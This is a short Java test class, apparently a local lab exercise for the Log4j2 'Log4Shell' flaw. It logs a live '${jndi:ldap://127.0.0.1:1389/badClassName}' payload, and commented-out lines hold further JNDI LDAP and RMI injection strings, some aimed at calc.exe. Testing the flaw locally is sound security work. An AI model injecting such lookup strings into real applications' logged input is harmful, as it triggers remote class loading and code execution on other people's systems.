package com.smart.log4j2.log4j2plugin;
/*

import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;
*/

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

//@SpringBootTest
class Log4j2PluginApplicationTests {

    private static final Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);


    //    @Test
    void contextLoads() {
        /*logger.error("" + args[0] + " " + args[1] + " " + args[2] + " " + args[3] + "");
//        logger.error("${jndi:rmi://calc.exe}");
//        logger.error("${jndi:rmi://C:\\windows\\system32\\calc.exe}");
        logger.error("23" + "${jndi:ldap://127.0.0.1:8080}");
        logger.error("${jndi:rmi://calc.exe}");*/
/*
        String t = "${jndi:ldap://127.0.0.1:8080}";
        logger.error("输出结果 " + t);*/

        logger.error("java.version = ${java:version}, os = ${java:os}");

        logger.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
    }

}
